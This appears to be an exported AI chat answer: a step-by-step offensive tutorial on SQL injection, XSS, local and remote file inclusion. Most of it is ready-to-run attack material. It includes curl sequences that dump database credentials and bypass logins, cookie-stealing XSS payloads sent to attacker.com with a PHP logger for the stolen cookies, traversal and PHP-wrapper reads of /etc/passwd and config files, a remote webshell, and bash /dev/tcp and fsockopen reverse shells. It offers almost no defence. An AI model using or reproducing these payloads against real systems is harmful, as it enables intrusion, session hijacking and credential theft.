# XSS, SQLi, LFI, RFI Explained

Table of Contents

1. [Introduction - The Four Main Web Vulnerabilities](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#introduction)
2. [SQL Injection (SQLi)](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#sql-injection-sqli)
3. [Cross-Site Scripting (XSS)](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#cross-site-scripting-xss)
4. [Local File Inclusion (LFI)](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#local-file-inclusion-lfi)
5. [Remote File Inclusion (RFI)](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#remote-file-inclusion-rfi)
6. [Decision Tree - Which Vulnerability to Try First](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#decision-tree)
7. [Real-World Scenarios](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#real-world-scenarios)

***

### INTRODUCTION

#### The Core Problem

Web applications take **user input** and use it in different contexts:

* Database queries
* HTML rendering
* File operations
* Remote URL loading

When input is **not validated/sanitized**, attackers can abuse it.

#### The Four Vulnerabilities at a Glance

```
SQLi    → Input goes into DATABASE QUERY
          Attacker: Manipulate SQL logic
          Result: Read/modify database

XSS     → Input goes into HTML PAGE
          Attacker: Inject JavaScript
          Result: Execute code in victim's browser

LFI     → Input goes into FILE INCLUDE/READ
          Attacker: Read any file server can access
          Result: Read system files, config, source code

RFI     → Input goes into REMOTE FILE LOAD
          Attacker: Load file from attacker's server
          Result: Remote code execution
```

***

### SQL INJECTION (SQLi)

#### What is SQL Injection?

**Definition:** Inserting malicious SQL code into user input fields that get executed by the database.

**The Core Idea:**

```
Normal request: "Give me user with username=admin"
Query: SELECT * FROM users WHERE username='admin'

Malicious request: "Give me ANY user (bypass password)"
Input: admin' OR '1'='1
Query: SELECT * FROM users WHERE username='admin' OR '1'='1'
Result: Returns ALL users because OR '1'='1' is ALWAYS TRUE
```

***

#### How It Happens - Vulnerable Code

**PHP Example (Most Common):**

```php
<?php
  // USER PROVIDES: $username (via GET/POST)
  $username = $_GET['username'];
  
  // VULNERABLE: Input directly in query
  $query = "SELECT * FROM users WHERE username='" . $username . "'";
  
  // Execute query
  $result = mysqli_query($conn, $query);
  
  if (mysqli_num_rows($result) > 0) {
    echo "User found!";
  }
?>
```

**What happens with normal input:**

```
Input: admin
Query: SELECT * FROM users WHERE username='admin'
Result: Returns admin user (if exists)
```

**What happens with SQL injection:**

```
Input: admin' OR '1'='1
Query: SELECT * FROM users WHERE username='admin' OR '1'='1'
       ↑                                              ↑
       Input ends quote                              Always true!
       
Result: Returns ALL users (because OR '1'='1' is always true)
```

***

#### Why It Works - The Quote Problem

The vulnerability exists because of **unmatched quotes**:

```sql
Original query template:
SELECT * FROM users WHERE username='INPUT'

When INPUT = admin' OR '1'='1

Becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1'
                         ^                             ^
                         User input closed quote     Extra quote!
                         
The EXTRA quote at the end is now floating, causing logic error
```

***

#### Types of SQL Injection

**1. In-Band (You See the Output)**

**A. Union-Based:**

```
Attacker combines results from two SELECT statements
Can see database contents directly in page response
```

**Example:**

```
Original: SELECT username, email FROM users WHERE id=1
Injected: SELECT username, email FROM users WHERE id=1 UNION SELECT password, credit_card FROM users
Result: Page shows passwords and credit card numbers!
```

**B. Error-Based:**

```
Attacker forces SQL errors that reveal information
Error messages leak database structure and data
```

**Example:**

```
Injected: SELECT * FROM users WHERE id=1 AND extractvalue(1, concat(0x7e, (SELECT password)))
Result: Error message shows password in the error!
```

***

**2. Blind (You Don't See Output)**

**A. Boolean-Based:**

```
Attacker crafts queries that return TRUE or FALSE
Judges by page response (loads differently for true vs false)
Extracts data character by character
```

**Example:**

```
Query 1: SELECT * FROM users WHERE id=1 AND '1'='1'   (TRUE - page loads normally)
Query 2: SELECT * FROM users WHERE id=1 AND '1'='2'   (FALSE - page shows error)

Then: SELECT * FROM users WHERE id=1 AND password LIKE 'a%'
If TRUE (page normal): password starts with 'a'
If FALSE (page error): password doesn't start with 'a'
Keep trying until you find it!
```

**B. Time-Based:**

```
Attacker forces delay on TRUE conditions
If query is true, database sleeps for X seconds
If query is false, responds immediately
```

**Example:**

```
Query 1: SELECT * FROM users WHERE id=1 AND IF(1=1, SLEEP(5), 0)
Result: Page takes 5 seconds to load (TRUE = sleep happened)

Query 2: SELECT * FROM users WHERE id=1 AND IF(1=2, SLEEP(5), 0)
Result: Page loads immediately (FALSE = no sleep)

Then: SELECT * FROM users WHERE id=1 AND IF(password LIKE 'a%', SLEEP(5), 0)
If page takes 5 seconds: password starts with 'a'
If immediate: password doesn't start with 'a'
```

***

#### Step-by-Step SQLi Exploitation

**Step 1: Identify Vulnerable Parameter**

```
Look for parameters that interact with data:
?id=1           ← Numbers (IDs)
?search=        ← Search boxes
?username=      ← Forms
?email=         ← Forms
?category=      ← Filters
?sort=          ← Sorting
```

***

**Step 2: Test for Vulnerability**

**Simple Test:**

```bash
# Normal request
curl "http://target/user?id=1"

# With SQL syntax
curl "http://target/user?id=1'"
# If error about SQL or quote: VULNERABLE!

# Boolean test
curl "http://target/user?id=1 AND 1=1"    # Same response as ?id=1
curl "http://target/user?id=1 AND 1=2"    # Different response?
# If different: VULNERABLE to boolean-based!
```

**What to look for:**

```
Error response:
- "SQL syntax error"
- "You have an error in your SQL syntax"
- "Warning: mysql_fetch_array()"
- "Warning: mysqli_fetch_all()"

Different page behavior:
- Normal vs error page
- Loaded vs blank
- Different number of results
```

***

**Step 3: Determine Query Type and Structure**

**Determine number of columns (for UNION attacks):**

```bash
# Try ordering by different numbers until error
curl "http://target/user?id=1 ORDER BY 1"     # Works?
curl "http://target/user?id=1 ORDER BY 2"     # Works?
curl "http://target/user?id=1 ORDER BY 3"     # Works?
curl "http://target/user?id=1 ORDER BY 4"     # ERROR! Too many columns
# Result: Query has 3 columns
```

**Identify injectable columns (for UNION attacks):**

```bash
# Create UNION SELECT with 3 columns
curl "http://target/user?id=1 UNION SELECT 1,2,3"

# Check which column displays:
# If you see "2" on page → column 2 is injectable
# If you see "1" on page → column 1 is injectable

curl "http://target/user?id=1 UNION SELECT 1,'test',3"
# If you see "test" on page → column 2 displays output!
```

***

**Step 4: Extract Data**

**Once you know injectable column, extract data:**

```bash
# Get database name
curl "http://target/user?id=1 UNION SELECT 1,database(),3"

# Get MySQL version
curl "http://target/user?id=1 UNION SELECT 1,@@version,3"

# Get username (current user)
curl "http://target/user?id=1 UNION SELECT 1,user(),3"

# Get list of all databases
curl "http://target/user?id=1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata"

# Get all tables in current database
curl "http://target/user?id=1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()"

# Get columns from specific table (e.g., users)
curl "http://target/user?id=1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'"

# Dump usernames and passwords
curl "http://target/user?id=1 UNION SELECT 1,CONCAT(username,':',password),3 FROM users"

# Dump everything with separators
curl "http://target/user?id=1 UNION SELECT username,password,email FROM users"
```

***

#### Common SQLi Payloads Reference

**For Login Bypass:**

```sql
' OR '1'='1          -- Always true
admin' --            -- Comment out password check
' OR 1=1 --          -- Numeric true
" OR "" = "          -- Double quote version
' OR 'x'='x          -- Matching strings
```

**Usage:**

```bash
# Try in username field
curl -X POST http://target/login \
  -d "username=' OR '1'='1&password=anything"

# Try in password field  
curl -X POST http://target/login \
  -d "username=admin&password=' OR '1'='1"

# Try in both
curl -X POST http://target/login \
  -d "username=' OR '1'='1&password=' OR '1'='1"
```

**For Data Extraction:**

```sql
UNION SELECT - Combine multiple queries
information_schema - Database of databases
GROUP_CONCAT() - Combine multiple rows into one
LIMIT - Limit results
OFFSET - Skip results
SUBSTRING() - Extract part of string
LENGTH() - Get string length
CAST() - Convert data types
```

***

#### Real Scenario - Walkthrough

**Scenario:** E-commerce site with product filter

```
URL: http://shop.com/products?category=electronics

Step 1: Test for SQLi
curl "http://shop.com/products?category=electronics'"
Response: SQL syntax error! VULNERABLE!

Step 2: Determine columns
curl "http://shop.com/products?category=electronics' ORDER BY 1"  ✓
curl "http://shop.com/products?category=electronics' ORDER BY 2"  ✓
curl "http://shop.com/products?category=electronics' ORDER BY 3"  ✓
curl "http://shop.com/products?category=electronics' ORDER BY 4"  ✗ ERROR
Result: 3 columns

Step 3: Find injectable column
curl "http://shop.com/products?category=' UNION SELECT 'test1','test2','test3'"
If page shows "test2": column 2 is injectable

Step 4: Extract database info
curl "http://shop.com/products?category=' UNION SELECT 1,database(),3"
Result: database_name = "shop_db"

Step 5: Get table names
curl "http://shop.com/products?category=' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='shop_db'"
Result: users, products, orders, admin_users

Step 6: Get admin credentials
curl "http://shop.com/products?category=' UNION SELECT 1,CONCAT(username,':',password),3 FROM admin_users"
Result: admin@site.com:hashed_password123

Step 7: If password not hashed or weak
Try password cracking with John or Hashcat
Or login with stolen credentials
```

***

### CROSS-SITE SCRIPTING (XSS)

#### What is XSS?

**Definition:** Injecting malicious JavaScript code that executes in a victim's browser.

**The Core Idea:**

```
Normal page: <h1>Welcome</h1>
Attacker injects: <h1>Welcome</h1><script>steal_cookies()</script>
Victim browser: Executes JavaScript code
Result: Attacker's script runs with victim's permissions
```

***

#### How It Happens - Vulnerable Code

**PHP Example:**

```php
<?php
  // USER PROVIDES: $name (via GET)
  $name = $_GET['name'];
  
  // VULNERABLE: Output directly to HTML
  echo "<h1>Welcome, $name!</h1>";
?>
```

**Normal request:**

```
URL: http://target.com/greet?name=Alice
Output: <h1>Welcome, Alice!</h1>
Browser displays: "Welcome, Alice!"
```

**XSS injection:**

```
URL: http://target.com/greet?name=<script>alert('XSS')</script>
Output: <h1>Welcome, <script>alert('XSS')</script>!</h1>
Browser: Executes JavaScript → shows alert box
```

***

#### Why It Works - HTML vs JavaScript

```html
<!-- Normal HTML -->
<h1>Welcome, Alice</h1>

<!-- What attacker injects -->
<h1>Welcome, <script>alert('XSS')</script></h1>

Browser parses HTML and sees:
- <h1> tag
- Text: "Welcome, "
- <script> tag ← OOPS! This is HTML too!
- JavaScript code inside script tag ← EXECUTED!
- </script> tag
- Text: "!"
- </h1> tag

Result: JavaScript runs!
```

***

#### Types of XSS

**1. Reflected XSS**

**What happens:**

```
1. Attacker sends victim malicious URL
2. URL contains JavaScript payload
3. Victim clicks link
4. Server reflects payload back in response
5. Browser executes payload
6. Attacker's script runs in victim's context
```

**Example:**

```
Vulnerable page displays search results:
http://target.com/search?q=alice

Attacker crafts malicious URL:
http://target.com/search?q=<img src=x onerror="document.location='http://attacker.com/steal?cookie='+document.cookie">

Victim clicks link → XSS triggers → Cookie sent to attacker
```

**Characteristics:**

* Lives in URL
* NOT saved on server
* Requires victim to click malicious link
* Most common type

***

**2. Stored XSS (Persistent)**

**What happens:**

```
1. Attacker submits malicious payload (via form/input)
2. Server STORES it in database
3. Page retrieves and displays stored payload
4. ANY user viewing the page gets infected
5. Attacker's script runs for everyone
```

**Example:**

```
Comment box on forum:
<textarea></textarea>

Attacker posts comment:
"Nice post! Check this out: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"

Server stores it in database
Every user viewing forum → Script executes → Cookies stolen
```

**Why it's more dangerous:**

* Affects ALL users, not just one
* Persists in database
* Hard to detect (hidden in legitimate-looking content)
* Can be used for mass stealing

***

**3. DOM-Based XSS**

**What happens:**

```
1. JavaScript on page modifies DOM (page content)
2. JavaScript takes user input from URL/form
3. JavaScript inserts it into page without sanitizing
4. Browser executes injected code
```

**Example (JavaScript code):**

```javascript
// Vulnerable code
var userInput = location.hash.substr(1);  // Get from URL
document.getElementById('greeting').innerHTML = "Hello " + userInput;

// If URL has: #<img src=x onerror=alert('XSS')>
// Result: <img> tag inserted into page and executed!
```

**Characteristics:**

* Vulnerability in JavaScript, not server
* Client-side execution
* Hard to detect with server-side tools

***

#### Step-by-Step XSS Exploitation

**Step 1: Identify Reflection Points**

```
Look for parameters that display on page:
?search=          ← Page shows your search term
?name=            ← Page greets you by name
?comment=         ← Page shows your comment
?error=           ← Page displays error message
?redirect=        ← Page shows redirect link
```

**Test with simple text:**

```bash
curl "http://target.com/search?q=alice"
# Does page show "alice"? If yes, it REFLECTS input
```

***

**Step 2: Test for XSS Vulnerability**

**Simple test:**

```bash
# Try basic script tag
curl "http://target.com/search?q=<script>alert(1)</script>"

# Look for:
# - <script> tag in response
# - alert(1) in response
# - If you see unescaped HTML tags → VULNERABLE!

# Test with img tag (harder to block)
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"

# Test with svg tag
curl "http://target.com/search?q=<svg onload=alert(1)>"
```

**Success indicators:**

```
Response contains:
<script>alert(1)</script>        ← Exact injection visible
<img src=x onerror=alert(1)>     ← Tag visible
<svg onload=alert(1)>            ← Tag visible

If you see these unescaped → XSS exists!
```

***

**Step 3: Choose Appropriate Payload**

**If \<script> tag works:**

```javascript
<script>
  // Steal cookies
  new Image().src='http://attacker.com/steal?c='+document.cookie;
  
  // Or shorter:
  fetch('http://attacker.com/log?cookie='+document.cookie);
</script>
```

**If \<script> blocked, try event handlers:**

```html
<!-- img tag -->
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">

<!-- svg tag -->
<svg onload="fetch('http://attacker.com/log?c='+document.cookie)">

<!-- body tag -->
<body onload="fetch('http://attacker.com/log?c='+document.cookie)">

<!-- input tag -->
<input onfocus="fetch('http://attacker.com/log?c='+document.cookie)" autofocus>

<!-- iframe -->
<iframe onload="fetch('http://attacker.com/log?c='+document.cookie)">

<!-- marquee -->
<marquee onstart="fetch('http://attacker.com/log?c='+document.cookie)">
```

***

**Step 4: Craft Malicious URL**

```bash
# Basic payload
PAYLOAD="<img src=x onerror=\"fetch('http://attacker.com/log?c='+document.cookie)\">"

# URL encode it
# ' becomes %27, " becomes %22, space becomes %20
ENCODED="%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Fattacker.com%2Flog%3Fc%3D%27%2Bdocument.cookie%29%22%3E"

# Full URL
MALICIOUS_URL="http://target.com/search?q=$ENCODED"
```

**Using curl:**

```bash
# Raw payload
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"

# URL encoded
curl "http://target.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

# POST request
curl -X POST http://target.com/submit \
  -d "comment=<img src=x onerror=alert(1)>"
```

***

**Step 5: Social Engineering**

**For reflected XSS:**

```
1. Create malicious URL with payload
2. Send to victims via email/chat/social media
3. Victims click link
4. XSS triggers
5. Attacker gets their cookies/session tokens
```

**For stored XSS:**

```
1. Post malicious comment/content on vulnerable site
2. Site stores it
3. Every user viewing that page gets infected
4. No need to social engineer (automatic infection)
5. Attacker continuously harvests cookies/data
```

***

#### Real Scenario - Cookie Stealing Walkthrough

**Scenario:** Forum allows HTML in profile bios

````
Step 1: Identify reflection
Profile URL: http://forum.com/user/john
Bio displays: "Welcome to John's profile"

Step 2: Test for XSS
Update bio with: Hello<script>alert(1)</script>
View profile → Alert box pops up! VULNERABLE!

Step 3: Create attacker server
```php
<?php
  // Log stolen cookies
  $cookie = $_GET['c'];
  file_put_contents('stolen.txt', $cookie."\n", FILE_APPEND);
  // Redirect back to appear normal
  header('Location: http://forum.com');
?>
````

Run on: attacker.com/log.php

Step 4: Craft XSS payload

```javascript
<script>
  fetch('http://attacker.com/log.php?c='+document.cookie);
  // Or img method
  new Image().src='http://attacker.com/log.php?c='+document.cookie;
</script>
```

Step 5: Update profile bio Bio: "Check out my cool site! \<script>new Image().src='http://attacker.com/log.php?c='+document.cookie;\</script>"

Step 6: Wait for victims Every user viewing profile → Cookie sent to attacker.com/stolen.txt

Step 7: Use stolen cookies

```bash
# Get stolen cookies
cat stolen.txt
# Example: PHPSESSID=abc123def456

# Use cookie in request
curl -b "PHPSESSID=abc123def456" http://forum.com/admin
# You're now logged in as victim!
```

***

### LOCAL FILE INCLUSION (LFI)

#### What is LFI?

**Definition:** Application includes/reads a file based on user input without proper validation, allowing attacker to read ANY file the server can access.

**The Core Idea:**

```
Normal: ?page=about → Server includes: about.php
Attacker: ?page=../../../etc/passwd → Server includes: /etc/passwd
Result: Attacker reads sensitive system files!
```

***

#### How It Happens - Vulnerable Code

**PHP Example:**

```php
<?php
  // USER PROVIDES: $page (via GET)
  $page = $_GET['page'];
  
  // VULNERABLE: Include based on user input
  include($page . '.php');
  
  // Or file reading
  echo file_get_contents($page);
?>
```

**Normal request:**

```
URL: http://target.com/page?page=about
Code: include('about' . '.php')  =  include('about.php')
Result: Displays about.php page
```

**LFI exploitation:**

```
URL: http://target.com/page?page=../../../etc/passwd
Code: include('../../../etc/passwd' . '.php')  = include('/etc/passwd.php')
Problem: /etc/passwd.php doesn't exist, but PHP STILL reads /etc/passwd!
```

***

#### Why It Works - Path Traversal

```
Server directory structure:
/var/www/html/
  ├── index.php
  ├── about.php
  ├── contact.php
  └── pages/
      ├── home.php
      └── profile.php

Normal include:
?page=about → /var/www/html/about.php ✓

Path traversal:
?page=../../../etc/passwd
Navigates:
  /var/www/html/ (current)
  /../../../ (go up 3 levels)
  = /etc/
  + passwd
  = /etc/passwd ✓

Server reads /etc/passwd even though it's outside web root!
```

***

#### Step-by-Step LFI Exploitation

**Step 1: Identify LFI Parameters**

```
Look for parameters suggesting file inclusion:
?file=        ← Direct file parameter
?page=        ← Page parameter
?path=        ← Path parameter
?include=     ← Include parameter
?view=        ← View parameter
?doc=         ← Document parameter
?category=    ← Category (sometimes includes files)
?lang=        ← Language files
?template=    ← Template files
```

**Test for vulnerability:**

```bash
# Normal request
curl "http://target.com/page?page=home"

# Test with traversal
curl "http://target.com/page?page=../../../../etc/passwd"

# If you see /etc/passwd contents → LFI EXISTS!
```

***

**Step 2: Determine Extension Appending**

**Check if server appends extension:**

```bash
# If error like "file not found: /etc/passwd.php"
# Server is appending .php extension!

# You need to bypass it
```

**Bypass Techniques:**

```bash
# Method 1: Null byte (PHP < 5.3.4)
curl "http://target.com/page?page=../../../../etc/passwd%00"
# %00 = null byte, truncates at .php.php%00.php becomes .php

# Method 2: Path traversal with extension
curl "http://target.com/page?page=../../../../etc/passwd/."
# . makes it a directory reference, sometimes bypasses extension

# Method 3: Add extra extension
curl "http://target.com/page?page=../../../../etc/passwd/.php"
# Results in: /etc/passwd/.php (fails to find) but reads /etc/passwd

# Method 4: Dot dot slash without extension check
curl "http://target.com/page?page=../../../../etc/passwd#"
# # starts comment, removes .php
```

***

**Step 3: Identify Useful Files to Read**

**Linux System Files:**

```
/etc/passwd                 - User list (readable by all)
/etc/shadow                 - Password hashes (needs root)
/etc/hosts                  - Hostname mappings
/proc/self/environ          - Environment variables
/proc/version               - Kernel version
/var/log/apache2/access.log - Web server logs (for log injection)
/root/.bash_history         - Root command history
/home/user/.ssh/id_rsa      - SSH private key (if readable)
/home/user/.ssh/authorized_keys - Allowed SSH keys
```

**Windows System Files:**

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```

**Web Application Files:**

```
config.php                  - Database credentials
database.php                - Database config
settings.php                - Application settings
.env                        - Environment variables
.htaccess                   - Apache configuration
web.config                  - IIS configuration
wp-config.php               - WordPress config
```

***

**Step 4: Read Files Using PHP Wrappers**

**When direct file read is blocked or file doesn't exist as readable:**

```bash
# Use PHP filter wrapper to encode as base64
curl "http://target.com/page?page=php://filter/convert.base64-encode/resource=index.php"

# Server tries to include: php://filter/...
# PHP processes filter wrapper
# Returns base64-encoded content (not executed as PHP!)

# You get: base64_encoded_string
# Decode: echo "base64_string" | base64 -d
```

**Other PHP wrappers:**

```bash
# Data wrapper (inject content)
curl "http://target.com/page?page=data:text/plain,<?php system('id'); ?>"

# Input wrapper (read from stdin)
echo "<?php system('id'); ?>" | curl "http://target.com/page?page=php://input"

# Expect wrapper (command execution - if enabled)
curl "http://target.com/page?page=expect://id"
```

***

#### Real Scenario - Reading Source Code

**Scenario:** Blog site with page inclusion

````
URL: http://blog.com/index.php?page=home

Step 1: Test for LFI
curl "http://blog.com/index.php?page=../../../../etc/passwd"
Response: Contains /etc/passwd contents!

Step 2: Identify extension
Try: ?page=../../../../etc/passwd.php
If error "file not found" → .php is appended!

Step 3: Bypass extension
curl "http://blog.com/index.php?page=../../../../etc/passwd%00"
Success! (if PHP < 5.3)

Step 4: Read source code
curl "http://blog.com/index.php?page=php://filter/convert.base64-encode/resource=index.php"
Response: base64_encoded_string

Step 5: Decode
echo "base64_string" | base64 -d
Output: Reveals index.php source code!

Step 6: Look for credentials in source
```php
$db_user = "admin";
$db_pass = "SuperSecret123!";
$db_host = "localhost";
````

Step 7: Use credentials Login to admin panel or database with found credentials

```

---

## REMOTE FILE INCLUSION (RFI)

### What is RFI?

**Definition:** Application includes/loads a file from a REMOTE server based on user input, allowing attacker to execute arbitrary code.

**The Core Idea:**
```

Normal: ?file=config → Server includes: config.php (local) Attacker: ?file=http://attacker.com/shell.php → Server includes: http://attacker.com/shell.php Result: Attacker's code executes on target server!

````

---

### How It Happens - Vulnerable Code

**PHP Example:**
```php
<?php
  // USER PROVIDES: $file (via GET)
  $file = $_GET['file'];
  
  // VULNERABLE: Include from potentially external source
  include($file);
  
  // Or require
  require($file . '.php');
?>
````

**Normal request:**

```
URL: http://target.com/index.php?file=home
Code: include('home')  = include('home.php')
Result: Displays home.php
```

**RFI exploitation:**

```
URL: http://target.com/index.php?file=http://attacker.com/shell
Code: include('http://attacker.com/shell.php')
Result: Downloads shell.php from attacker.com and executes it!
        Attacker's code runs on target server!
```

***

#### Why It Works - Remote URL Execution

```
Server sees:
include('http://attacker.com/shell.php');

PHP processes:
1. Downloads shell.php from attacker.com
2. Executes the PHP code
3. Returns output

Attacker controls shell.php, so attacker controls execution!
```

***

#### Step-by-Step RFI Exploitation

**Step 1: Identify RFI Parameters**

```
Same as LFI, but now test with REMOTE URLs:
?file=
?page=
?include=
?url=
?path=
?lib=
etc.
```

**Test for vulnerability:**

```bash
# Test with external URL
curl "http://target.com/index.php?file=http://attacker.com/test"

# Success indicators:
# - Page loads attacker's content
# - No "URL wrapper disabled" error
# - Page structure changes based on remote URL
```

***

**Step 2: Check if URL Wrappers Enabled**

```bash
# Try to fetch external content
curl "http://target.com/index.php?file=http://google.com"

# If it works: allow_url_include = ON

# If error like "URL wrapper not allowed":
# allow_url_include = OFF (harder to exploit)
```

***

**Step 3: Create Remote Webshell**

**On your server (attacker.com):**

Create file: shell.php

```php
<?php
  // Simple command execution
  system($_GET['cmd']);
?>
```

Upload to: http://attacker.com/shell.php

***

**Step 4: Include Remote Shell**

**On target server:**

```bash
# Include remote shell.php
curl "http://target.com/index.php?file=http://attacker.com/shell&cmd=id"

# Server:
# 1. Downloads http://attacker.com/shell (gets shell.php via HTTP)
# 2. Executes it (PHP code runs)
# 3. Executes: system('id')
# 4. Returns output to attacker

# Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

**Step 5: Escalate to Interactive Shell**

```bash
# Get reverse shell
curl "http://target.com/index.php?file=http://attacker.com/shell&cmd=bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261"

# Meanwhile on attacker machine:
nc -lvnp 4444

# Result: Interactive shell on target!
```

***

#### Real Scenario - Full RFI Exploitation

**Scenario:** Web app allows including templates from URL

```
URL: http://app.com/template.php?template=http://localhost/default

Step 1: Test for RFI
curl "http://app.com/template.php?template=http://attacker.com/test"
Response: Shows content from attacker.com
RFI EXISTS!

Step 2: Create shell on attacker.com
$ cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
$ Upload to http://attacker.com/shell.php

Step 3: Test command execution
curl "http://app.com/template.php?template=http://attacker.com/shell&cmd=whoami"
Response: www-data
SUCCESS! Code execution!

Step 4: Enumerate target
curl "http://app.com/template.php?template=http://attacker.com/shell&cmd=id"
curl "http://app.com/template.php?template=http://attacker.com/shell&cmd=pwd"
curl "http://app.com/template.php?template=http://attacker.com/shell&cmd=ls+-la"

Step 5: Get reverse shell
On attacker: nc -lvnp 4444

Execute:
curl "http://app.com/template.php?template=http://attacker.com/shell&cmd=bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261"

Step 6: Interactive access
$ nc -lvnp 4444
[bash connection established]
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/passwd
[read files]
$ find / -name "*.sql" 2>/dev/null
[find databases]
```

***

### DECISION TREE - Which Vulnerability to Try First

```
You found a vulnerable parameter!

Is it a DATA parameter? (id, email, username, search, etc.)
├─ YES
│  └─ Try SQL Injection first
│     If parameter goes into database query
│     ?id=1 AND 1=1 (behaves differently from ?id=1 AND 1=2)
│     ✓ SQLi likely
│     
│     If doesn't react to SQL syntax:
│     └─ Try XSS
│        ?name=<img src=x onerror=alert(1)>
│        If you see <img src=x...> in page: ✓ XSS
│        
│  └─ Try XSS
│     Page displays user input
│     Test: ?search=<script>alert(1)</script>
│     If you see script tags in page: ✓ XSS
│
Is it a FILE/PAGE parameter? (page, file, include, view, etc.)
├─ YES
│  └─ Try LFI first
│     ?page=../../../../etc/passwd
│     If error or file contents show: ✓ LFI
│     
│     If LFI fails:
│     └─ Try RFI
│        ?file=http://attacker.com/shell
│        If attacker's content appears: ✓ RFI

Is it a URL parameter? (url, link, next, return, redirect, etc.)
└─ YES
   └─ Try RFI/SSRF
      ?next=http://attacker.com/malicious
      If connection is made: ✓ RFI/SSRF
      
      Try LFI with file:// protocol
      ?url=file:///etc/passwd
      If contents show: ✓ LFI via file protocol
```

***

### REAL-WORLD SCENARIOS

#### Scenario 1: Login Form with SQLi

```
Target: http://banking.local/login.php

Form:
Username: [________]
Password: [________]
[Login]

Attack:
1. Try: admin
   Result: User not found

2. Try: admin' --
   Result: Blank password field, login succeeds!
   You're logged in as admin!

Why it worked:
Original query: SELECT * FROM users WHERE username='admin' AND password='....'
Your input: SELECT * FROM users WHERE username='admin' -- ' AND password='....'
Comment removes password check!

3. Access admin panel
   View: Bank transactions, user data, etc.
```

***

#### Scenario 2: Search with Stored XSS

```
Target: http://forum.local/post.php?id=123

Comments section allows HTML:

Attack:
1. Post comment:
   "Great post! <script>document.location='http://attacker/steal?c='+document.cookie</script>"

2. Server saves it to database (Stored XSS!)

3. Every user viewing this post:
   - Sees the comment
   - JavaScript executes
   - Cookie sent to attacker.com

4. Attacker harvests cookies from all forum users

5. Use cookies to impersonate users
   curl -b "session=stolen_cookie" http://forum.local/profile
   You're logged in as different user!
```

***

#### Scenario 3: Blog with LFI

```
Target: http://blog.local/index.php?page=home

Attack:
1. Enumerate files:
   ?page=index                 Shows index.php content
   ?page=config               Shows config with DB credentials
   
2. Read sensitive files:
   ?page=../../../../etc/passwd
   Shows: root:x:0:0:root:/root:/bin/bash
          www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   
3. Read web config:
   ?page=../../../../var/www/config
   Shows: $db_user = "blogadmin"
          $db_pass = "P@ssw0rd123"
          $db_host = "db.local"
   
4. Use credentials to access database directly
   mysql -u blogadmin -p'P@ssw0rd123' -h db.local
   Access all data, modify content, create backdoors
```

***

#### Scenario 4: Template Inclusion with RFI

```
Target: http://app.local/template.php?page=default

Attack:
1. Test for RFI:
   ?page=http://attacker.com/test
   Response includes content from attacker.com
   RFI CONFIRMED!

2. Create malicious PHP on attacker.com:
   http://attacker.com/reverse.php
   <?php
   $ip = "attacker.com";
   $port = 4444;
   $sock = fsockopen($ip, $port);
   exec("/bin/bash -i <&3 >&3 2>&3");
   ?>

3. Trigger it:
   ?page=http://attacker.com/reverse
   
4. Meanwhile, listening on attacker:
   $ nc -lvnp 4444
   [connection received]
   $ id
   uid=33(www-data) gid=33(www-data)
   
5. Full shell access!
```

***

### Summary - Quick Reference

| Vuln | Input Goes To        | Attacker Does        | Attack Vector                       |
| ---- | -------------------- | -------------------- | ----------------------------------- |
| SQLi | Database Query       | Manipulate SQL logic | Modify WHERE, UNION SELECT, comment |
| XSS  | HTML Page            | Inject JavaScript    | Script tags, event handlers         |
| LFI  | File Include (local) | Read any file        | Path traversal (../)                |
| RFI  | Remote Include       | Execute remote code  | URL to attacker's server            |

***

### Testing Checklist

```
For every parameter:

□ SQLi Test
  □ username' → Error?
  □ username' AND 1=1 → Different response?
  □ ?id=1 UNION SELECT 1,2,3 → Error about columns?
  □ ?id=1 ORDER BY 1/2/3 → Error on specific number?

□ XSS Test
  □ parameter<script>alert(1)</script> → See script tag in HTML?
  □ parameter<img src=x onerror=alert(1)> → See img tag?
  □ parameter<svg onload=alert(1)> → See svg tag?

□ LFI Test
  □ page=../../../../etc/passwd → See file contents?
  □ file=php://filter/convert.base64-encode/resource=index.php → Get base64?

□ RFI Test
  □ file=http://attacker.com/test → Attacker content displayed?
  □ Check: allow_url_include error?

□ Command Injection Test
  □ param; whoami → Command executed?
  □ param && whoami → Command executed?
  □ param | whoami → Command executed?
```
